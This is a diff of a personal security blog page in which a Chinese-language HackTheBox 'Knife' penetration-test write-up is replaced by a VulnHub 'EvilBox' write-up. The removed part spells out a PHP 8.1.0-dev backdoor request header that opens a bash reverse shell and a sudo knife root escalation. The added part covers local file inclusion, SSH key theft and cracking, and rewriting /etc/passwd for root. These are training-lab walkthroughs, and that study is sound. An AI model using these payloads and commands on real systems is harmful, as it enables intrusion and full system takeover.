@@ -20,46 +20,48 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="Hackthebox-Knife">
+<meta name="description" content="VulnHub-EvilBoxLevel: Easy">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HackTheBox-Knife">
-<meta property="og:url" content="http://example.com/2022/01/07/HackTheBox-Knife/index.html">
+<meta property="og:title" content="VulnHub-EvilBox">
+<meta property="og:url" content="http://example.com/2022/01/12/VulnHub-EvilBox/index.html">
 <meta property="og:site_name" content="Jasontt&#39;s Blog">
-<meta property="og:description" content="Hackthebox-Knife">
+<meta property="og:description" content="VulnHub-EvilBoxLevel: Easy">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pwned.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Knife_nmap.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/web.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dirsearch.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/head.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/PHP810backdoor.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getshell.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userflag.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jamessudo.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/aboutKnife.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/knife.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/knifeexec.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/useexec.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/root.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/error.png">
-<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag.png">
-<meta property="article:published_time" content="2022-01-07T10:03:34.000Z">
-<meta property="article:modified_time" content="2022-01-14T06:31:55.784Z">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154334064.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154632629.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154742384.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154858822.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106155532979.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106160625267.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106160741944.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106181809019.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106181933222.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106182035033.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106182312683.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106182436881.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107140908040.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/[KTE3AA07]O75A1%7BEM1ETI9.jpg">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107142131515.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107143509973.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107144251045.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107145912769.png">
+<meta property="article:published_time" content="2022-01-12T10:05:00.000Z">
+<meta property="article:modified_time" content="2022-01-24T10:08:54.019Z">
 <meta property="article:author" content="Jason Tu">
-<meta property="article:tag" content="HackTheBox">
 <meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="vulhub">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pwned.png">
+<meta name="twitter:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154334064.png">
 
 
-<link rel="canonical" href="http://example.com/2022/01/07/HackTheBox-Knife/">
+<link rel="canonical" href="http://example.com/2022/01/12/VulnHub-EvilBox/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/01/07/HackTheBox-Knife/","path":"2022/01/07/HackTheBox-Knife/","title":"HackTheBox-Knife"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/01/12/VulnHub-EvilBox/","path":"2022/01/12/VulnHub-EvilBox/","title":"VulnHub-EvilBox"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>HackTheBox-Knife | Jasontt's Blog</title>
+<title>VulnHub-EvilBox | Jasontt's Blog</title>
   
 
 
@@ -165,7 +167,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hackthebox-Knife"><span class="nav-number">1.</span> <span class="nav-text">Hackthebox-Knife</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%EF%BC%88PHP8-1-0-dev%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%E5%90%8E%E9%97%A8%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">发现漏洞（PHP8.1.0-dev开发版本后门）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9Shell"><span class="nav-number">1.3.</span> <span class="nav-text">反弹Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-number">1.5.</span> <span class="nav-text">写在最后</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.6.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#VulnHub-EvilBox"><span class="nav-number">1.</span> <span class="nav-text">VulnHub-EvilBox</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Before-Start"><span class="nav-number">1.1.</span> <span class="nav-text">Before Start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">1.2.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gobuster"><span class="nav-number">1.2.2.</span> <span class="nav-text">gobuster</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.3.1.</span> <span class="nav-text">任意文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#John"><span class="nav-number">1.3.2.</span> <span class="nav-text">John</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.4.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -244,7 +246,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/07/HackTheBox-Knife/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/12/VulnHub-EvilBox/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/touxiang.jpg">
@@ -257,7 +259,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          HackTheBox-Knife
+          VulnHub-EvilBox
         </h1>
 
         <div class="post-meta-container">
@@ -268,14 +270,14 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2022-01-07 18:03:34" itemprop="dateCreated datePublished" datetime="2022-01-07T18:03:34+08:00">2022-01-07</time>
+      <time title="Created: 2022-01-12 18:05:00" itemprop="dateCreated datePublished" datetime="2022-01-12T18:05:00+08:00">2022-01-12</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-01-14 14:31:55" itemprop="dateModified" datetime="2022-01-14T14:31:55+08:00">2022-01-14</time>
+        <time title="Modified: 2022-01-24 18:08:54" itemprop="dateModified" datetime="2022-01-24T18:08:54+08:00">2022-01-24</time>
       </span>
 
   
@@ -295,66 +297,63 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="Hackthebox-Knife"><a href="#Hackthebox-Knife" class="headerlink" title="Hackthebox-Knife"></a>Hackthebox-Knife</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pwned.png" alt="Pwned"></p>
+        <h1 id="VulnHub-EvilBox"><a href="#VulnHub-EvilBox" class="headerlink" title="VulnHub-EvilBox"></a>VulnHub-EvilBox</h1><p><strong>Level: Easy</strong></p>
 <span id="more"></span>
 
-<blockquote>
-<p>本机IP：10.10.16.6</p>
-<p>目标IP：10.10.10.242</p>
-</blockquote>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Knife_nmap.png" alt="nmap"></p>
-<p>开放了22和80端口，直接访问看看网站功能</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/web.png" alt="web"></p>
-<p>上面导航栏是假的根本点不了，<code>ctrl+u</code>查看网页源代码，似乎就当前页面</p>
-<p><strong>Dirsearch</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dirsearch.png" alt="dirsearch"></p>
-<p>访问<code>../login</code>，和<code>index.php</code>一模一样</p>
-<h2 id="发现漏洞（PHP8-1-0-dev开发版本后门）"><a href="#发现漏洞（PHP8-1-0-dev开发版本后门）" class="headerlink" title="发现漏洞（PHP8.1.0-dev开发版本后门）"></a>发现漏洞（PHP8.1.0-dev开发版本后门）</h2><p><strong>Burpsuite</strong></p>
-<p>发现请求头有问题</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/head.png" alt="head"></p>
-<p><code>PHP/8.1.0-dev backdoor rce</code>在某场CTF比赛里碰到过</p>
-<p>攻击者可以通过发送<code>User-Agentt</code>头来执行任意代码（具体网上都能查到）</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/PHP810backdoor.png" alt="PHP810backdoor"></p>
-<h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><p>添加请求头<code>User-Agentt: zerodiumsystem(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/2333 0&gt;&amp;1&#39;&quot;);</code></p>
-<p>监听2333端口成功反弹shell</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getshell.png" alt="getshell"></p>
-<p>在james用户主目录得到<code>user flag</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userflag.png" alt="userflag"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看james用户的sudo权限</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jamessudo.png" alt="jamessudo"></p>
-<p>可以无密码运行<code>/usr/bin/knife</code></p>
-<p>Google上搜一下<strong>Knife</strong> ，发现是一个命令行工具</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/aboutKnife.png" alt="aboutKnife"></p>
-<p><code>sudo knife</code>运行可以看到Knife的各种命令参数</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/knife.png" alt="knife"></p>
-<p>其中有一个exec 我们似乎可以利用</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/knifeexec.png" alt="knifeexec"></p>
-<p>看一下用法</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/useexec.png" alt="useexec"></p>
-<blockquote>
-<p>Knife exec有两个参数</p>
-<p>-E CODE<code>, </code>–exec CODE</p>
-<p>A string of code to be executed.</p>
-<p>-p PATH:PATH<code>, </code>–script-path PATH:PATH</p>
-<p>A colon-separated path at which Ruby scripts are located. Use to override the default location for scripts. When this option is not specified, knife will look for scripts located in <code>chef-repo/.chef/scripts</code> directory.</p>
-</blockquote>
-<p>用 Ruby 代码执行 shell 脚本的方式放在参考链接第二个了，<code>system</code>的用法其实没啥区别</p>
-<p>接下来可以提权了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo knife exec -E &quot;system(&#x27;/bin/sh -i&#x27;)&quot; //-i：实现脚本交互</span><br></pre></td></tr></table></figure>
+<h2 id="Before-Start"><a href="#Before-Start" class="headerlink" title="Before Start"></a>Before Start</h2><p>用VMware导入ovf发现靶机没有IP时的处理方法如下：</p>
+<p>在下图载入界面时按e</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154334064.png" alt="image-20220106154334064"></p>
+<p>把<code>ro</code>改成<code>rw signie init=/bin/bash </code>，修改完毕Ctrl+x重启服务</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154632629.png" alt="image-20220106154632629"></p>
+<p>进入如下界面以后用vi修改网卡配置文件，<code>vi  /etc/network/interfaces</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154742384.png" alt="image-20220106154742384"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154858822.png" alt="image-20220106154858822"></p>
+<p>把网卡改成ens33即可，重启网卡服务<code>/etc/init.d/networking restart</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106155532979.png" alt="image-20220106155532979"></p>
+<p>重启靶机虽然没有显示IP但是问题已经解决了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106160625267.png" alt="image-20220106160625267"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106160741944.png" alt="image-20220106160741944"></p>
+<p>开放22、80端口</p>
+<h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106181809019.png" alt="image-20220106181809019"></p>
+<p>发现<code>robots.txt</code>和<code>secret</code>，依次访问结果如下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106181933222.png" alt="image-20220106181933222"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106182035033.png" alt="image-20220106182035033"></p>
+<p>加上<code>/secret</code>继续爆破，发现<code>evil.php</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106182312683.png" alt="image-20220106182312683"></p>
+<p>访问<code>evil.php</code>还是个空白页</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106182436881.png" alt="image-20220106182436881"></p>
+<p>fuzz一下发现存在文件包含，GET参数为<strong>command</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107140908040.png" alt="image-20220107140908040"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h3><p>通过<code>php://filter/convert.base64-encode/resource=evil.php</code>查看<code>evil.php</code>源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>可以看到我们已经拿到root的权限了</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/root.png" alt="root"></p>
-<p>注意，如果shell没有升级情况如下，升级一下就行（另一台靶机记录里写过，姿势很多）</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/error.png" alt="error"></p>
-<p>接下来可以去找root的flag了</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag.png" alt="rootflag"></p>
+<p>文件包含没错了，可以看看其他目录是否存在敏感文件</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/[KTE3AA07]O75A1%7BEM1ETI9.jpg" alt="img"></p>
+<h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><p>在<code>/home/mowree/.ssh/</code>目录下可以获得私钥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107142131515.png" alt="image-20220107142131515"></p>
+<p>用ssh2john.py获取一下hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py id_rsa &gt; hash.txt</span><br></pre></td></tr></table></figure>
+
+<p>再用john进行破解，得到密码为<strong>unicorn</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john ~/桌面/hash.txt -w /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107143509973.png" alt="image-20220107143509973"></p>
+<p>使用ssh连接获得user.txt</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107144251045.png" alt="image-20220107144251045"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>简单尝试没有sudo提权</p>
+<p>发现/etc/passwd文件任意用户可以读写</p>
+<p>那么提权的方式就很多了</p>
+<blockquote>
+<p>1、自己添加一个拥有root权限的用户</p>
+<p>2、修改root用户的密码</p>
+</blockquote>
+<p>我这里直接修改了root用户本身的密码为root</p>
+<p>先用openssl生成密码为：root （密码随意）的哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 root</span><br></pre></td></tr></table></figure>
+
+<p>直接修改<code>/etc/passwd</code>文件即可</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107145912769.png" alt="image-20220107145912769"></p>
 <p>end</p>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>最近渗透靶机做的多了，对整个流程也熟悉了起来，由于漏洞点比赛碰到过可能没怎么卡壳</p>
-<p>本台靶机对我来说难点还是在提权吧，提权的方法和知识还是需要多多学习</p>
-<p>Google搜索信息也是解题不可分割的一环，碰到没见过的东西要现学现用</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://docs.chef.io/workstation/knife/">https://docs.chef.io/workstation/knife/</a></p>
-<p><a target="_blank" rel="noopener" href="http://thelazylog.com/executing-shell-script-from-ruby-code/">http://thelazylog.com/executing-shell-script-from-ruby-code/</a></p>
 
     </div>
 
@@ -364,21 +363,21 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
               <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/vulhub/" rel="tag"># vulhub</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/01/07/HackTheBox-Dynstr/" rel="prev" title="HackTheBox-Dynstr">
-                  <i class="fa fa-chevron-left"></i> HackTheBox-Dynstr
+                <a href="/2022/01/12/Sqlmap%E6%BA%90%E7%A0%81%E9%80%9A%E8%AF%BB%201.0/" rel="prev" title="sqlmap源码通读 1.0">
+                  <i class="fa fa-chevron-left"></i> sqlmap源码通读 1.0
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/01/07/HackTheBox-Oopsie/" rel="next" title="HackTheBox-Oopsie">
-                  HackTheBox-Oopsie <i class="fa fa-chevron-right"></i>
+                <a href="/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/" rel="next" title="Python库劫持">
+                  Python库劫持 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
